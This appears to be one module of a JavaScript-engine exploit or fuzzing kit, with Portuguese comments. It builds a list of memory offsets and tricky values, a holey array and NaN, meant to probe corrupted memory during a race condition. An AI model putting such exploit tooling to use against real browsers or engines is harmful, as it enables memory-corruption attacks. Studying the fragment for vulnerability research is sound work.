
/**
 * MÓDULO 2: MUTATOR (DEEP SCANNER EDITION)
 * Foco: Sondar diferentes profundidades (offsets) da memória corrompida
 * aguardando a Race Condition abrir a janela de leitura.
 */

export const Mutator = {
    getPayloads: function() {
        const payloads = [];

        // =========================================================
        // OFSSET SCANNERS (Leitura de Profundidade)
        // Como estamos usando getBigUint64, pulamos de 8 em 8 bytes.
        // =========================================================
        
        payloads.push({ type: "OFFSET", label: "Offset_00 (Header)", val: 0 });
        payloads.push({ type: "OFFSET", label: "Offset_08 (Pointer 1)", val: 8 });
        payloads.push({ type: "OFFSET", label: "Offset_16 (Pointer 2)", val: 16 });
        payloads.push({ type: "OFFSET", label: "Offset_24 (Pointer 3)", val: 24 });
        payloads.push({ type: "OFFSET", label: "Offset_32 (Pointer 4)", val: 32 });
        payloads.push({ type: "OFFSET", label: "Offset_40 (Pointer 5)", val: 40 });
        payloads.push({ type: "OFFSET", label: "Offset_48 (Pointer 6)", val: 48 });
        payloads.push({ type: "OFFSET", label: "Offset_64 (Pointer 7)", val: 64 });
        payloads.push({ type: "OFFSET", label: "Offset_128 (Deep)", val: 128 });

        // Mantemos alguns payloads clássicos que geram conversões difíceis
        // para o motor JS, aumentando a chance da Race Condition.
        let holey = [1, 2, 3]; holey[100] = 4;
        payloads.push({ type: "MEMORY", label: "Holey_Array", val: holey });
        
        payloads.push({ type: "PRIMITIVE", label: "NaN", val: NaN });

        return payloads;
    }
};
